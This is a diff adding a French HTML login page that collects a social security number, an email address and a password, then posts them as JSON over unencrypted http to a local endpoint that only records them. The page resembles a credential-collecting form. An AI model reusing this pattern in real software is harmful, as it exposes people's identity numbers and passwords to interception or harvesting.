@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Connexion</title>
+    <style>
+        /* Mise en page de base */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f7fc;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Conteneur principal */
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Titre */
+        h2 {
+            text-align: center;
+            color: #005d89;
+            font-size: 24px;
+        }
+
+        /* Styles pour les champs de saisie */
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #005d89;
+            font-size: 16px;
+        }
+
+        /* Bouton de soumission */
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background-color: #005d89;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .btn-primary:hover {
+            background-color: #00456a;
+        }
+
+        /* Style des messages d'erreur */
+        .error-message {
+            color: #d9534f;
+            display: none;
+            text-align: center;
+        }
+
+        /* Style des labels */
+        .form-label {
+            color: #005d89;
+            font-size: 16px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Conteneur principal -->
+    <div class="container">
+        <h2>Formulaire de Connexion</h2>
+
+        <!-- Formulaire de saisie -->
+        <form id="loginForm">
+            <!-- Champ Numéro de Sécurité Sociale -->
+            <div class="mb-3">
+                <label for="numSecu" class="form-label">Numéro de Sécurité Sociale</label>
+                <input type="text" class="form-control" id="numSecu" placeholder="Numéro de sécurité sociale" required>
+            </div>
+
+            <!-- Champ Email -->
+            <div class="mb-3">
+                <label for="email" class="form-label">Adresse e-mail</label>
+                <input type="email" class="form-control" id="email" placeholder="Votre e-mail" required>
+            </div>
+
+            <!-- Champ Mot de Passe -->
+            <div class="mb-3">
+                <label for="password" class="form-label">Mot de passe</label>
+                <input type="password" class="form-control" id="password" placeholder="Mot de passe" required>
+            </div>
+
+            <!-- Bouton de soumission -->
+            <button type="submit" class="btn-primary">Soumettre</button>
+        </form>
+
+        <!-- Message d'erreur -->
+        <div id="errorMessage" class="error-message mt-3">Veuillez remplir tous les champs correctement.</div>
+    </div>
+
+    <script>
+        // Fonction pour envoyer les données du formulaire au serveur
+        document.getElementById('loginForm').addEventListener('submit', function (event) {
+            event.preventDefault();  // Empêcher la soumission par défaut du formulaire
+
+            const numSecu = document.getElementById('numSecu').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Vérification que tous les champs sont remplis
+            if (!numSecu || !email || !password) {
+                document.getElementById('errorMessage').style.display = 'block';
+            } else {
+                // Envoi des données au serveur via fetch
+                fetch('http://localhost:3000/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ numSecu, email, password })
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            alert("Les données ont été enregistrées avec succès !");
+                            document.getElementById('loginForm').reset();  // Réinitialiser le formulaire
+                        } else {
+                            alert("Erreur lors de l'enregistrement.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Erreur d'envoi:", error);
+                        alert("Une erreur est survenue, veuillez réessayer.");
+                    });
+            }
+        });
+    </script>
+
+</body>
+
+</html>
